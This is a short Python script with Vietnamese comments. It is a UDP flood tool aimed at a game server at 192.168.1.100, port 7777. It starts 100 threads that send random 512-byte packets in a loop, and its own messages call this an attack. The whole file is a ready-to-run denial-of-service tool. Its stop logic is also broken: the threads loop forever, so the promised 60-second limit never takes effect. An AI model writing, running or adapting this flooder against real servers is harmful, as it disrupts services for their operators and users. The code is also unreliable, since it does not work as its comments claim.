import socket
import random
import time
import threading

# Hàm gửi gói tin UDP
def send_udp_packet(ip, port, delay_ms):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(512)  # Kích thước gói tin ngẫu nhiên
    while True:
        sock.sendto(data, (ip, port))
        time.sleep(delay_ms / 1000.0)  # Delay giữa các gói tin (ms)

# Hàm bắt đầu tấn công với nhiều luồng và delay
def udp_flood(ip, port, duration, num_threads, delay_ms):
    timeout = time.time() + duration  # Thời gian kết thúc tấn công
    threads = []

    # Tạo và bắt đầu các luồng
    for _ in range(num_threads):
        t = threading.Thread(target=send_udp_packet, args=(ip, port, delay_ms))
        threads.append(t)
        t.start()

    # Chờ cho tất cả luồng kết thúc sau khi thời gian tấn công đã trôi qua
    time.sleep(duration)

    # Dừng tất cả các luồng
    for t in threads:
        t.join()

# Main function
if __name__ == "__main__":
    ip = "192.168.1.100"   # IP của server game
    port = 7777             # Cổng của server game
    duration = 60           # Thời gian tấn công (giây)
    num_threads = 100      # Số lượng luồng
    delay_ms = 10          # Delay giữa các gói tin (ms)

    print(f"Bắt đầu tấn công UDP vào {ip}:{port} trong {duration} giây với {num_threads} luồng.")
    udp_flood(ip, port, duration, num_threads, delay_ms)
    print("Kết thúc tấn công.")
